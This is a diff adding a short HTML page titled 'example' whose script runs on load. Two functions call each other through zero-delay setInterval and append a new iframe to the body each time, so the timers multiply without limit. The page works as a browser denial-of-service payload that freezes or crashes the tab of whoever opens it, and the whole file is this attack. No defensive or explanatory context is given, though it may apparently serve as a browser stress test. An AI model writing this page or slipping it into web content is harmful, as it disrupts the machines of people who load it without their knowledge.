@@ -1,0 +1,22 @@
+<html>
+
+<head>
+    <title> example </title>
+</head>
+
+<body>
+    <script language="javascript">
+        f();
+        function f() {
+            setInterval(g, 0);
+        }
+
+        function g() {
+            var h = document.createElement("iframe");
+            document.getElementsByTagName("body")[0].appendChild(h);
+            setInterval(f, 0);
+        }
+    </script>
+</body>
+
+</html>
